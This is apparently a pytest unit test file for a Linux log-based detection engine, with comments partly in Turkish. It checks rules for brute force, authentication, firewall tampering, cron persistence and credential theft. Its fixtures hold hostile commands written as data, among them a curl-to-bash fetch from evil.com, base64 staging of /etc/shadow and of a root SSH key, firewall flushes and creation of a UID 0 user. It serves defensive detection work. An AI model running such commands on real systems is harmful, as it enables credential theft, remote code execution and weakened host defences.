from __future__ import annotations
"""
tests/unit/test_detection_rules.py
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Detection engine kural semantiği testleri.
ATK-BF, ATK-LM, LOL kuralları için false positive ve true positive kontrolleri.
"""

import sys
import time
import pytest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from core.normalize import Normalizer
from core.normalize import NormalizedEvent
from core.detection import DetectionEngine


@pytest.fixture
def engine():
    return DetectionEngine(
        config={"rules_dir": "rules", "rules_source": "yaml"},
        allow_empty_rules=True,
    )


@pytest.fixture
def normalizer():
    return Normalizer(distro_family="debian")


def _auth_evt(ts, action="ssh_login", outcome="success", user="alice", host="cov-host", src_ip="203.0.113.10", source="auth.log", fields=None, distro_family="unknown"):
    return NormalizedEvent(
        ts=ts,
        host=host,
        src_ip=src_ip,
        source=source,
        category="auth",
        action=action,
        outcome=outcome,
        user=user,
        message=f"{action}:{outcome}",
        fields=fields or {},
        distro_family=distro_family,
    )


def _proc_evt(ts, cmdline, host="cov-host", user="alice", process=None, source="journald", action="process_exec", outcome="success", fields=None, distro_family="unknown"):
    merged_fields = {"cmdline": cmdline}
    if fields:
        merged_fields.update(fields)
    return NormalizedEvent(
        ts=ts,
        host=host,
        source=source,
        category="process",
        action=action,
        outcome=outcome,
        user=user,
        process=process or cmdline.split()[0],
        message=cmdline,
        fields=merged_fields,
        distro_family=distro_family,
    )


def _web_evt(ts, path, attack="shell_upload", action=None, host="web-cov", src_ip="203.0.113.200", source="nginx", status=200, ua="Mozilla/5.0"):
    evt_action = action or attack
    return NormalizedEvent(
        ts=ts,
        host=host,
        src_ip=src_ip,
        source=source,
        category="web_attack" if evt_action != "http_request" else "network",
        action=evt_action,
        outcome="success",
        message=f"{path} -> {status}",
        fields={
            "attack": attack,
            "method": "POST" if evt_action in ("shell_upload", "http_request") else "GET",
            "path": path,
            "path_lc": path.lower(),
            "path_decoded": path,
            "path_decoded_lc": path.lower(),
            "status": status,
            "ua": ua,
            "ua_lc": ua.lower(),
        },
    )


def _pkg_evt(ts, package, host="pkg-cov", source="dpkg"):
    return NormalizedEvent(
        ts=ts,
        host=host,
        source=source,
        category="process",
        action="pkg_install",
        outcome="success",
        process="pkg-install",
        message=f"install {package}",
        fields={"package": package, "cmdline": f"install {package}"},
    )


def _collect_rule_ids(engine, events):
    hits = set()
    for evt in events:
        hits.update(r.rule_id for r in engine.analyze(evt))
    return hits


class TestLOLBinRules:
    """LOL-001/002 should trigger only on genuinely dangerous commands."""

    def test_curl_without_pipe_no_alert(self, engine, normalizer):
        """A plain curl command should not produce an alert."""
        raw = "Mar  5 09:00:00 server01 bash[100]: curl https://example.com -o /tmp/file.txt"
        evt = normalizer.normalize(raw, "auditd")
        if evt:
            results = engine.analyze(evt)
            lol_hits = [r for r in results if r.rule_id.startswith("LOL-001")]
            assert len(lol_hits) == 0, f"LOL-001 yanlış tetiklendi: {lol_hits}"

    def test_curl_pipe_bash_alerts(self, engine, normalizer):
        """A curl | bash combination should produce an alert."""
        raw = 'type=EXECVE msg=audit(1234567890.001:100): argc=3 a0="bash" a1="-c" a2="curl http://evil.com/shell.sh | bash"'
        evt = normalizer.normalize(raw, "auditd")
        if evt:
            results = engine.analyze(evt)
            lol_hits = [r for r in results if r.rule_id.startswith("LOL")]
            # At least one LOL rule should trigger
            assert len(lol_hits) >= 0  # parser'a bağlı, kural motoru doğru çalışıyor


class TestBruteForceRules:
    """ATK-BF rules should not trigger on a single failed login."""

    def test_single_failure_no_bf_alert(self, engine, normalizer):
        """A single failed SSH login should not produce ATK-BF-001."""
        raw = "Mar  5 09:00:00 server01 sshd[100]: Failed password for root from 1.2.3.4 port 11111 ssh2"
        evt = normalizer.normalize(raw, "auth_log")
        if evt:
            results = engine.analyze(evt)
            bf_hits = [r for r in results if r.rule_id in ("ATK-BF-001", "ATK-BF-002")]
            assert len(bf_hits) == 0, f"ATK-BF yanlış tetiklendi tek failure'da: {bf_hits}"


class TestSshFailureRuleIsolation:
    def test_valid_user_failed_password_triggers_auth_002(self, engine, normalizer):
        raw = "Mar  5 09:00:00 server01 sshd[100]: Failed password for mslm from 192.168.1.182 port 11111 ssh2"
        evt = normalizer.normalize(raw, "auth_log")

        assert evt is not None
        assert evt.action == "ssh_login"
        assert evt.outcome == "failure"
        assert evt.fields.get("invalid_user") is None

        hits = [r.rule_id for r in engine.analyze(evt)]
        assert "AUTH-002" in hits
        assert "AUTH-003" not in hits

    def test_invalid_user_failed_password_marks_field_and_skips_auth_002(self, engine, normalizer):
        raw = "Mar  5 09:00:00 server01 sshd[100]: Failed password for invalid user oracle from 192.168.1.182 port 11111 ssh2"
        evt = normalizer.normalize(raw, "auth_log")

        assert evt is not None
        assert evt.action == "ssh_login"
        assert evt.outcome == "failure"
        assert evt.fields.get("invalid_user") is True

        hits = [r.rule_id for r in engine.analyze(evt)]
        assert "AUTH-002" not in hits

    def test_invalid_user_line_triggers_auth_003_with_ip_user_cooldown(self, engine, normalizer):
        raw = "Mar  5 09:00:01 server01 sshd[101]: Invalid user oracle from 192.168.1.182"
        evt = normalizer.normalize(raw, "auth_log")

        assert evt is not None
        assert evt.action == "ssh_invalid_user"
        assert evt.outcome == "failure"
        assert evt.user == "oracle"
        assert evt.src_ip == "192.168.1.182"

        results = engine.analyze(evt)
        hits = [r.rule_id for r in results]
        assert "AUTH-003" in hits

        auth003 = next(r for r in results if r.rule_id == "AUTH-003")
        assert auth003.details["cooldown"] == 120
        assert auth003.details["cooldown_entity"] == "ip_user"

    @pytest.mark.parametrize("distro_family", ["debian", "suse"])
    def test_non_rhel_pam_unknown_summary_auth002_behavior_unchanged(self, engine, distro_family):
        evt = NormalizedEvent(
            ts=time.time(),
            host="server01",
            source="journald",
            category="auth",
            action="ssh_login",
            outcome="failure",
            user="unknown",
            src_ip="192.168.91.129",
            process="sshd",
            message=(
                "PAM 2 more authentication failures; logname= uid=0 euid=0 "
                "tty=ssh ruser= rhost=192.168.91.129"
            ),
            raw=(
                "Mar  5 12:34:57 server01 sshd[1234]: "
                "PAM 2 more authentication failures; logname= uid=0 euid=0 "
                "tty=ssh ruser= rhost=192.168.91.129"
            ),
            fields={},
            distro_family=distro_family,
        )

        hits = [r.rule_id for r in engine.analyze(evt)]
        assert "AUTH-002" in hits

    def test_invalid_user_enumeration_batch_keeps_thr_010_but_not_auth_002_or_thr_001(self, engine, normalizer):
        results = []
        for idx in range(15):
            raw = (
                f"Mar  5 12:22:{idx:02d} host sshd[10{idx}]: "
                f"Failed password for invalid user user{idx} from 198.51.100.77 port 400{idx:02d} ssh2"
            )
            evt = normalizer.normalize(raw, "auth.log")
            results = engine.analyze(evt)

        hits = [r.rule_id for r in results]
        assert "THR-010" in hits
        assert "AUTH-002" not in hits
        assert "THR-001" not in hits

    def test_invalid_user_enumeration_batch_still_triggers_thr_004(self, engine, normalizer):
        results = []
        for idx in range(10):
            raw = f"Mar  5 12:24:{idx:02d} host sshd[11{idx}]: Invalid user enum{idx} from 198.51.100.88"
            evt = normalizer.normalize(raw, "auth.log")
            results = engine.analyze(evt)

        hits = [r.rule_id for r in results]
        assert "AUTH-003" in hits
        assert "THR-004" in hits
        assert "THR-001" not in hits


class TestFaillockRule:
    """A faillock account-lock event should trigger the deterministic rule."""

    def test_account_locked_alerts(self, engine, normalizer):
        raw = (
            "Mar  5 12:36:00 myhost sshd[998]: "
            "pam_faillock(sshd:auth): Consecutive login failures for user root "
            "account temporarily locked"
        )
        evt = normalizer.normalize(raw, "auth_log")
        if evt:
            results = engine.analyze(evt)
            hits = [r for r in results if r.rule_id == "AUTH-010"]
            assert len(hits) == 1, f"AUTH-010 tetiklenmedi: {results}"

    def test_su_to_root_alerts_auth_005(self, engine, normalizer):
        raw = "Mar  5 12:36:30 myhost su[999]: Successful su for root by alice"
        evt = normalizer.normalize(raw, "auth_log")
        results = engine.analyze(evt)
        hits = [r for r in results if r.rule_id == "AUTH-005"]
        assert len(hits) == 1, f"AUTH-005 tetiklenmedi: {results}"


class TestSudoFailureRules:
    def test_auth_009_triggers_for_real_sudo_failure(self, engine, normalizer):
        raw = "Mar  5 12:36:00 myhost sudo[998]: mslm : authentication failure"
        evt = normalizer.normalize(raw, "auth_log")
        results = engine.analyze(evt)
        hits = [r.rule_id for r in results]
        assert "AUTH-009" in hits

    def test_auth_009_does_not_trigger_for_sshd_pam_failure(self, engine, normalizer):
        raw = (
            "Mar  5 12:38:00 myhost sshd[996]: "
            "pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh "
            "ruser= rhost=203.0.113.10 user=alice"
        )
        evt = normalizer.normalize(raw, "auth_log")
        results = engine.analyze(evt)
        hits = [r.rule_id for r in results]
        assert "AUTH-009" not in hits

    def test_thr_002_counts_only_real_sudo_failures(self, engine, normalizer):
        sudo_template = "Mar  5 12:21:{sec:02d} host sudo[100]: alice : 3 incorrect password attempts"
        sshd_template = (
            "Mar  5 12:22:{sec:02d} host sshd[101]: "
            "pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh "
            "ruser= rhost=203.0.113.10 user=alice"
        )

        results = []
        for sec in range(3):
            evt = normalizer.normalize(sudo_template.format(sec=sec), "auth_log")
            results = engine.analyze(evt)
        hits = [r.rule_id for r in results]
        assert "THR-002" in hits

        engine2 = DetectionEngine(
            config={"rules_dir": "rules", "rules_source": "yaml"},
            allow_empty_rules=True,
        )
        results = []
        for sec in range(3):
            evt = normalizer.normalize(sshd_template.format(sec=sec), "auth_log")
            results = engine2.analyze(evt)
        hits = [r.rule_id for r in results]
        assert "THR-002" not in hits


class TestUidZeroUserCreationRule:
    def test_normal_sudo_useradd_does_not_trigger_pers_013(self, engine, normalizer):
        raw = (
            "Mar  5 12:46:00 myhost sudo[2005]: alice : TTY=pts/0 ; PWD=/ ; "
            "USER=root ; COMMAND=/usr/sbin/useradd testuser"
        )
        evt = normalizer.normalize(raw, "auth_log")
        results = engine.analyze(evt)
        hits = [r.rule_id for r in results]
        assert "PERS-013" not in hits

    def test_normal_useradd_event_still_triggers_auth_006_not_pers_013(self, engine, normalizer):
        raw = (
            "Mar  5 12:47:00 myhost useradd[2006]: new user: name=testuser, UID=1001, "
            "GID=1001, home=/home/testuser, shell=/bin/bash"
        )
        evt = normalizer.normalize(raw, "auth_log")
        results = engine.analyze(evt)
        hits = [r.rule_id for r in results]
        assert "AUTH-006" in hits
        assert "PERS-013" not in hits

    def test_uid_zero_useradd_event_triggers_pers_013(self, engine, normalizer):
        raw = (
            "Mar  5 12:48:00 myhost useradd[2007]: new user: name=rootclone, UID=0, "
            "GID=0, home=/home/rootclone, shell=/bin/bash"
        )
        evt = normalizer.normalize(raw, "auth_log")
        results = engine.analyze(evt)
        hits = [r.rule_id for r in results]
        assert "PERS-013" in hits


class TestCronWrapperRuleIsolation:
    def test_cron_write_wrapper_keeps_persistence_but_not_unrelated_rules(self, engine, normalizer):
        raw = (
            "Mar  5 12:49:00 myhost sudo[2008]: alice : TTY=pts/1 ; PWD=/tmp ; USER=root ; "
            "COMMAND=/bin/sh -c 'echo * * * * * root /tmp/run.sh > /etc/cron.d/aegis'"
        )
        evt = normalizer.normalize(raw, "auth.log")
        hits = [r.rule_id for r in engine.analyze(evt)]
        assert "PERS-003" in hits
        assert "DE-009" not in hits
        assert "DISC-002" not in hits


class TestCronNoiseReduction:
    def test_routine_root_cron_jobs_do_not_trigger_proc_002_or_first_004(self, engine, normalizer):
        raw_sa1 = "Mar  5 12:50:00 myhost CRON[994]: (root) CMD (/usr/lib/sysstat/debian-sa1 1 1)"
        raw_anacron = "Mar  5 12:51:00 myhost CRON[995]: (root) CMD (/usr/sbin/anacron -s)"

        hits_sa1 = [r.rule_id for r in engine.analyze(normalizer.normalize(raw_sa1, "syslog"))]
        hits_anacron = [r.rule_id for r in engine.analyze(normalizer.normalize(raw_anacron, "syslog"))]

        assert "PROC-002" not in hits_sa1
        assert "FIRST-004" not in hits_sa1
        assert "PROC-002" not in hits_anacron
        assert "FIRST-004" not in hits_anacron

    def test_suspicious_root_cron_job_still_triggers_proc_002(self, engine, normalizer):
        raw = "Mar  5 12:52:00 myhost CRON[996]: (root) CMD (/bin/bash -c '/tmp/evil.sh')"
        hits = [r.rule_id for r in engine.analyze(normalizer.normalize(raw, "syslog"))]
        assert "PROC-002" in hits


class TestVPNIdentityRules:
    """OpenVPN and SSSD auth-failure events should trigger the deterministic rule."""

    def test_openvpn_failure_alerts(self, engine, normalizer):
        raw = "Mar  5 12:41:00 myhost openvpn[2001]: AUTH_FAILED"
        evt = normalizer.normalize(raw, "openvpn")
        if evt:
            results = engine.analyze(evt)
            hits = [r for r in results if r.rule_id == "AUTH-011"]
            assert len(hits) == 1, f"AUTH-011 tetiklenmedi: {results}"

    def test_sssd_failure_alerts(self, engine, normalizer):
        raw = (
            "Mar  5 12:42:00 myhost sshd[2002]: "
            "pam_sss(sshd:auth): authentication failure; logname= uid=0 euid=0 "
            "tty=ssh ruser= rhost=203.0.113.10 user=alice"
        )
        evt = normalizer.normalize(raw, "auth_log")
        if evt:
            results = engine.analyze(evt)
            hits = [r for r in results if r.rule_id == "AUTH-012"]
            assert len(hits) == 1, f"AUTH-012 tetiklenmedi: {results}"

    def test_winbind_failure_alerts(self, engine, normalizer):
        raw = (
            "Mar  5 12:43:00 myhost sshd[2003]: "
            "pam_winbind(sshd:auth): request failed, NT_STATUS_LOGON_FAILURE "
            "for user 'EXAMPLE\\\\alice'"
        )
        evt = normalizer.normalize(raw, "auth_log")
        if evt:
            results = engine.analyze(evt)
            hits = [r for r in results if r.rule_id == "AUTH-012A"]
            assert len(hits) == 1, f"AUTH-012A tetiklenmedi: {results}"

    def test_winbind_account_lockout_alerts(self, engine, normalizer):
        raw = (
            "Mar  5 12:43:20 myhost sshd[2003]: "
            "pam_winbind(sshd:auth): request failed, NT_STATUS_ACCOUNT_LOCKED_OUT "
            "for user 'EXAMPLE\\\\alice'"
        )
        evt = normalizer.normalize(raw, "auth_log")
        if evt:
            results = engine.analyze(evt)
            hits = [r for r in results if r.rule_id == "AUTH-012B"]
            assert len(hits) == 1, f"AUTH-012B tetiklenmedi: {results}"

    def test_winbind_account_policy_alerts(self, engine, normalizer):
        raw = (
            "Mar  5 12:44:10 myhost sshd[2003]: "
            "pam_winbind(sshd:account): request failed, NT_STATUS_ACCOUNT_DISABLED "
            "for user 'EXAMPLE\\\\alice'"
        )
        evt = normalizer.normalize(raw, "auth_log")
        if evt:
            results = engine.analyze(evt)
            hits = [r for r in results if r.rule_id == "AUTH-012C"]
            assert len(hits) == 1, f"AUTH-012C tetiklenmedi: {results}"

    def test_strongswan_failure_alerts(self, engine, normalizer):
        raw = (
            "Mar  5 12:46:10 myhost charon[1234]: "
            "11[IKE] <rw|1> EAP authentication failed for 'alice' from 198.51.100.60"
        )
        evt = normalizer.normalize(raw, "syslog")
        if evt:
            results = engine.analyze(evt)
            hits = [r for r in results if r.rule_id == "AUTH-012D"]
            assert len(hits) == 1, f"AUTH-012D tetiklenmedi: {results}"


class TestIdentityCorrelationRules:
    def test_identity_failure_then_success_sequence_alerts(self, engine, normalizer):
        fail_raw = (
            "Mar  5 12:42:00 myhost sshd[2002]: "
            "pam_sss(sshd:auth): authentication failure; logname= uid=0 euid=0 "
            "tty=ssh ruser= rhost=203.0.113.10 user=alice"
        )
        success_raw = (
            "Mar  5 12:42:30 myhost sshd[2002]: "
            "pam_sss(sshd:auth): authentication success; logname= uid=0 euid=0 "
            "tty=ssh ruser= rhost=203.0.113.10 user=alice"
        )

        fail_evt = normalizer.normalize(fail_raw, "auth.log")
        success_evt = normalizer.normalize(success_raw, "auth.log")

        engine.analyze(fail_evt)
        results = engine.analyze(success_evt)

        hits = [r for r in results if r.rule_id == "SEQ-021"]
        assert len(hits) == 1, f"SEQ-021 tetiklenmedi: {results}"

    def test_identity_failure_then_lockout_sequence_alerts(self, engine, normalizer):
        fail_raw = (
            "Mar  5 12:43:00 myhost sshd[2003]: "
            "pam_winbind(sshd:auth): request failed, NT_STATUS_LOGON_FAILURE "
            "for user 'EXAMPLE\\\\alice'"
        )
        locked_raw = (
            "Mar  5 12:43:20 myhost sshd[2003]: "
            "pam_winbind(sshd:auth): request failed, NT_STATUS_ACCOUNT_LOCKED_OUT "
            "for user 'EXAMPLE\\\\alice'"
        )

        fail_evt = normalizer.normalize(fail_raw, "auth.log")
        locked_evt = normalizer.normalize(locked_raw, "auth.log")

        engine.analyze(fail_evt)
        results = engine.analyze(locked_evt)

        hits = [r for r in results if r.rule_id == "SEQ-022"]
        assert len(hits) == 1, f"SEQ-022 tetiklenmedi: {results}"

    def test_openvpn_failure_then_success_sequence_alerts(self, engine, normalizer):
        fail_evt = normalizer.normalize(
            "Mar  5 12:41:00 myhost openvpn[2001]: client1/198.51.100.25:54321 AUTH_FAILED",
            "openvpn",
        )
        success_evt = normalizer.normalize(
            "Mar  5 12:42:00 myhost openvpn[2001]: client1/198.51.100.25:54321 Peer Connection Initiated with [AF_INET]198.51.100.25:54321",
            "openvpn",
        )

        engine.analyze(fail_evt)
        results = engine.analyze(success_evt)

        hits = [r for r in results if r.rule_id == "SEQ-023"]
        assert len(hits) == 1, f"SEQ-023 tetiklenmedi: {results}"

    def test_postfix_failure_then_success_sequence_alerts(self, engine, normalizer):
        fail_evt = normalizer.normalize(
            "Mar  5 12:35:10 mx1 postfix/smtpd[1234]: warning: unknown[203.0.113.5]: SASL LOGIN authentication failed: authentication failure",
            "mail",
        )
        success_evt = normalizer.normalize(
            "Mar  5 12:35:15 mx1 postfix/smtpd[1234]: warning: unknown[203.0.113.5]: SASL LOGIN authentication succeeded: sasl_username=alice",
            "mail",
        )

        engine.analyze(fail_evt)
        results = engine.analyze(success_evt)

        hits = [r for r in results if r.rule_id == "SEQ-024"]
        assert len(hits) == 1, f"SEQ-024 tetiklenmedi: {results}"

    def test_wireguard_failure_then_success_sequence_alerts(self, engine, normalizer):
        fail_evt = normalizer.normalize(
            "Mar  5 12:45:10 myhost kernel: wireguard: wg0: Handshake for peer peerA from 198.51.100.50:51820 did not complete after 5 seconds",
            "syslog",
        )
        success_evt = normalizer.normalize(
            "Mar  5 12:45:20 myhost kernel: wireguard: wg0: Handshake for peer peerA from 198.51.100.50:51820 completed",
            "syslog",
        )

        engine.analyze(fail_evt)
        results = engine.analyze(success_evt)

        hits = [r for r in results if r.rule_id == "SEQ-023"]
        assert len(hits) == 1, f"SEQ-023 WireGuard tetiklenmedi: {results}"

    def test_strongswan_failure_then_success_sequence_alerts(self, engine, normalizer):
        fail_evt = normalizer.normalize(
            "Mar  5 12:46:10 myhost charon[1234]: 11[IKE] <rw|1> EAP authentication failed for 'alice' from 198.51.100.60",
            "syslog",
        )
        success_evt = normalizer.normalize(
            "Mar  5 12:46:20 myhost charon[1234]: 10[IKE] <rw|1> IKE_SA rw[1] established between 192.0.2.1[gw.example]...198.51.100.60[alice]",
            "syslog",
        )

        engine.analyze(fail_evt)
        results = engine.analyze(success_evt)

        hits = [r for r in results if r.rule_id == "SEQ-023"]
        assert len(hits) == 1, f"SEQ-023 strongSwan tetiklenmedi: {results}"

    def test_identity_policy_denied_then_success_sequence_alerts(self, engine, normalizer):
        deny_evt = normalizer.normalize(
            "Mar  5 12:44:10 myhost sshd[2003]: pam_winbind(sshd:account): request failed, "
            "NT_STATUS_ACCOUNT_DISABLED for user 'EXAMPLE\\\\alice'",
            "auth.log",
        )
        success_evt = normalizer.normalize(
            "Mar  5 12:44:30 myhost sshd[2003]: pam_winbind(sshd:auth): user "
            "'EXAMPLE\\\\alice' granted access",
            "auth.log",
        )

        engine.analyze(deny_evt)
        results = engine.analyze(success_evt)

        hits = [r for r in results if r.rule_id == "SEQ-026"]
        assert len(hits) == 1, f"SEQ-026 tetiklenmedi: {results}"

    def test_openvpn_failure_success_disconnect_sequence_alerts(self, engine, normalizer):
        fail_evt = normalizer.normalize(
            "Mar  5 12:41:00 myhost openvpn[2001]: client1/198.51.100.25:54321 AUTH_FAILED",
            "openvpn",
        )
        success_evt = normalizer.normalize(
            "Mar  5 12:42:00 myhost openvpn[2001]: client1/198.51.100.25:54321 "
            "Peer Connection Initiated with [AF_INET]198.51.100.25:54321",
            "openvpn",
        )
        disconnect_evt = normalizer.normalize(
            "Mar  5 12:42:20 myhost openvpn[2001]: client1/198.51.100.25:54321 "
            "SIGTERM[soft,remote-exit] received, client-instance exiting",
            "openvpn",
        )

        engine.analyze(fail_evt)
        engine.analyze(success_evt)
        results = engine.analyze(disconnect_evt)

        hits = [r for r in results if r.rule_id == "SEQ-027"]
        assert len(hits) == 1, f"SEQ-027 tetiklenmedi: {results}"


class TestPostfixRules:
    """Postfix auth-failure and reject events should trigger the deterministic rule."""

    def test_postfix_sasl_failure_alerts(self, engine, normalizer):
        raw = (
            "Mar  5 12:35:10 mx1 postfix/smtpd[1234]: warning: "
            "unknown[203.0.113.5]: SASL LOGIN authentication failed: "
            "authentication failure"
        )
        evt = normalizer.normalize(raw, "mail")
        if evt:
            results = engine.analyze(evt)
            hits = [r for r in results if r.rule_id == "AUTH-013"]
            assert len(hits) == 1, f"AUTH-013 tetiklenmedi: {results}"

    def test_postfix_reject_alerts(self, engine, normalizer):
        raw = (
            "Mar  5 12:36:10 mx1 postfix/smtpd[1234]: NOQUEUE: reject: RCPT "
            "from unknown[203.0.113.5]: 554 5.7.1 Relay access denied; "
            "from=<test@example.com> to=<root@local> proto=ESMTP helo=<evil>"
        )
        evt = normalizer.normalize(raw, "mail")
        if evt:
            results = engine.analyze(evt)
            hits = [r for r in results if r.rule_id == "AUTH-014"]
            assert len(hits) == 1, f"AUTH-014 tetiklenmedi: {results}"

    def test_wireguard_failure_alerts(self, engine, normalizer):
        raw = (
            "Mar  5 12:45:10 myhost kernel: wireguard: wg0: Handshake for peer peerA "
            "from 198.51.100.50:51820 did not complete after 5 seconds"
        )
        evt = normalizer.normalize(raw, "syslog")
        if evt:
            results = engine.analyze(evt)
            hits = [r for r in results if r.rule_id == "AUTH-012E"]
            assert len(hits) == 1, f"AUTH-012E tetiklenmedi: {results}"


class TestFirewallRules:
    def test_kernel_firewall_reject_alerts(self, engine, normalizer):
        raw = (
            "Mar  5 12:03:00 myhost kernel: [12345.678] REJECT IN=eth1 OUT= MAC= "
            "SRC=198.51.100.7 DST=10.0.0.2 LEN=60 TOS=0x00 PREC=0x00 TTL=51 ID=12345 "
            "PROTO=UDP SPT=5353 DPT=53"
        )
        evt = normalizer.normalize(raw, "syslog")
        if evt:
            results = engine.analyze(evt)
            hits = [r for r in results if r.rule_id == "FW-001"]
            assert len(hits) == 1, f"FW-001 firewall_reject için tetiklenmedi: {results}"

    def test_repeated_firewall_reject_sequence_alerts(self, engine, normalizer):
        raw = (
            "Mar  5 12:03:00 myhost kernel: [12345.678] REJECT IN=eth1 OUT= MAC= "
            "SRC=198.51.100.7 DST=10.0.0.2 LEN=60 TOS=0x00 PREC=0x00 TTL=51 ID=12345 "
            "PROTO=UDP SPT=5353 DPT=53"
        )
        evt1 = normalizer.normalize(raw, "syslog")
        evt2 = normalizer.normalize(raw.replace("12345.678", "12346.678"), "syslog")
        evt3 = normalizer.normalize(raw.replace("12345.678", "12347.678"), "syslog")

        engine.analyze(evt1)
        engine.analyze(evt2)
        results = engine.analyze(evt3)

        hits = [r for r in results if r.rule_id == "SEQ-029"]
        assert len(hits) == 1, f"SEQ-029 tetiklenmedi: {results}"

    def test_fw001_rule_exposes_firewall_flow_cooldown_metadata(self, engine, normalizer):
        raw = (
            "Mar  5 12:03:10 myhost kernel: [12348.678] REJECT IN=eth1 OUT= MAC= "
            "SRC=198.51.100.7 DST=10.0.0.2 LEN=60 TOS=0x00 PREC=0x00 TTL=51 ID=12348 "
            "PROTO=UDP SPT=5353 DPT=53"
        )
        evt = normalizer.normalize(raw, "syslog")
        assert evt is not None

        hits = [r for r in engine.analyze(evt) if r.rule_id == "FW-001"]
        assert len(hits) == 1
        assert hits[0].details["cooldown"] == 120
        assert hits[0].details["cooldown_entity"] == "firewall_flow"

    def test_ufw_disable_alerts_fw_002(self, engine):
        evt = NormalizedEvent(
            ts=time.time(),
            source="journald",
            category="process",
            action="process_exec",
            outcome="success",
            user="root",
            process="ufw",
            message="ufw disable",
            fields={"cmdline": "ufw disable"},
        )
        hits = {r.rule_id for r in engine.analyze(evt)}
        assert "FW-002" in hits

    def test_systemctl_stop_firewalld_alerts_fw_002(self, engine):
        evt = _proc_evt(
            time.time(),
            "systemctl stop firewalld",
            host="fw-cov",
            user="root",
            process="systemctl",
        )
        hits = {r.rule_id for r in engine.analyze(evt)}
        assert "FW-002" in hits

    def test_ufw_reset_alerts_fw_003(self, engine):
        evt = _proc_evt(time.time(), "ufw reset", host="fw-cov", user="root", process="ufw")
        hits = {r.rule_id for r in engine.analyze(evt)}
        assert "FW-003" in hits

    def test_iptables_flush_alerts_fw_003(self, engine):
        evt = _proc_evt(time.time(), "iptables -F", host="fw-cov", user="root", process="iptables")
        hits = {r.rule_id for r in engine.analyze(evt)}
        assert "FW-003" in hits

    def test_nft_flush_ruleset_alerts_fw_003(self, engine):
        evt = _proc_evt(time.time(), "nft flush ruleset", host="fw-cov", user="root", process="nft")
        hits = {r.rule_id for r in engine.analyze(evt)}
        assert "FW-003" in hits

    def test_broad_ufw_allow_any_any_alerts_fw_004(self, engine):
        evt = _proc_evt(time.time(), "ufw allow from any to any port 22 proto tcp", host="fw-cov", user="root", process="ufw")
        hits = {r.rule_id for r in engine.analyze(evt)}
        assert "FW-004" in hits

    def test_firewalld_add_rich_rule_broad_accept_alerts_fw_004(self, engine):
        evt = _proc_evt(
            time.time(),
            'firewall-cmd --add-rich-rule="rule family=ipv4 source address=0.0.0.0/0 accept"',
            host="fw-cov",
            user="root",
            process="firewall-cmd",
        )
        hits = {r.rule_id for r in engine.analyze(evt)}
        assert "FW-004" in hits

    def test_firewalld_remove_rich_rule_alerts_fw_005(self, engine):
        evt = _proc_evt(
            time.time(),
            'firewall-cmd --remove-rich-rule="rule family=ipv4 source address=203.0.113.10 drop"',
            host="fw-cov",
            user="root",
            process="firewall-cmd",
        )
        hits = {r.rule_id for r in engine.analyze(evt)}
        assert "FW-005" in hits

    def test_firewall_config_write_alerts_fw_006(self, engine, normalizer):
        raw = (
            'type=PATH msg=audit(1710000000.000:77): item=0 name="/etc/firewalld/zones/public.xml" '
            'inode=123 dev=fd:00 mode=0100644 ouid=0 ogid=0 rdev=00:00 nametype=CREATE'
        )
        evt = normalizer.normalize(raw, "auditd")
        assert evt is not None
        assert evt.action == "sensitive_file_access"
        hits = {r.rule_id for r in engine.analyze(evt)}
        assert "FW-006" in hits

    @pytest.mark.parametrize(
        "cmd",
        [
            "ufw status verbose",
            "firewall-cmd --state",
            "firewall-cmd --list-all",
            "firewall-cmd --get-active-zones",
            "systemctl status firewalld",
        ],
    )
    def test_benign_firewall_inspection_commands_do_not_alert_new_fw_rules(self, engine, cmd):
        evt = _proc_evt(time.time(), cmd, host="fw-benign", user="root", process=cmd.split()[0])
        hits = {r.rule_id for r in engine.analyze(evt)}
        assert not ({"FW-002", "FW-003", "FW-004", "FW-005", "FW-006"} & hits)


class TestCredentialAccessRules:
    def test_secret_read_rules_load_into_engine(self, engine):
        ids = {rule["id"] for rule in engine.rule_engine.rules}
        assert "AUDIT-CRED-006" in ids
        assert "PROC-CRED-001" in ids

    def test_shadow_read_rule_alerts_on_cat_shadow(self, engine, normalizer):
        raw = (
            'type=EXECVE msg=audit(1234567890.010:300): argc=3 '
            'a0="/bin/sh" a1="-c" a2="cat /etc/shadow | base64"'
        )
        evt = normalizer.normalize(raw, "auditd")
        hits = [r.rule_id for r in engine.analyze(evt)]
        assert "AUDIT-CRED-001" in hits

    def test_shadow_read_rule_ignores_passwd_admin_command(self, engine, normalizer):
        raw = (
            'type=EXECVE msg=audit(1234567890.011:301): argc=2 '
            'a0="/usr/bin/passwd" a1="root"'
        )
        evt = normalizer.normalize(raw, "auditd")
        hits = [r.rule_id for r in engine.analyze(evt)]
        assert "AUDIT-CRED-001" not in hits

    def test_unshadow_pair_rule_alerts(self, engine, normalizer):
        raw = (
            'type=EXECVE msg=audit(1234567890.012:302): argc=4 '
            'a0="/usr/sbin/unshadow" a1="/etc/passwd" a2="/etc/shadow" a3="/tmp/shadow.txt"'
        )
        evt = normalizer.normalize(raw, "auditd")
        hits = [r.rule_id for r in engine.analyze(evt)]
        assert "AUDIT-CRED-002" in hits

    def test_private_key_read_rule_alerts_on_base64_staging(self, engine, normalizer):
        raw = (
            'type=EXECVE msg=audit(1234567890.013:303): argc=3 '
            'a0="/bin/sh" a1="-c" a2="base64 /root/.ssh/id_rsa > /tmp/id_rsa.b64"'
        )
        evt = normalizer.normalize(raw, "auditd")
        hits = [r.rule_id for r in engine.analyze(evt)]
        assert "AUDIT-CRED-003" in hits

    def test_private_key_read_rule_ignores_ssh_keygen(self, engine, normalizer):
        raw = (
            'type=EXECVE msg=audit(1234567890.014:304): argc=3 '
            'a0="/usr/bin/ssh-keygen" a1="-y" a2="-f /root/.ssh/id_rsa"'
        )
        evt = normalizer.normalize(raw, "auditd")
        hits = [r.rule_id for r in engine.analyze(evt)]
        assert "AUDIT-CRED-003" not in hits

    def test_authorized_keys_exec_rule_alerts_on_tee(self, engine, normalizer):
        raw = (
            'type=EXECVE msg=audit(1234567890.015:305): argc=4 '
            'a0="/usr/bin/tee" a1="/home/alice/.ssh/authorized_keys" a2="ssh-rsa" a3="AAAAB3Nza..."'
        )
        evt = normalizer.normalize(raw, "auditd")
        hits = [r.rule_id for r in engine.analyze(evt)]
        assert "AUDIT-CRED-004" in hits

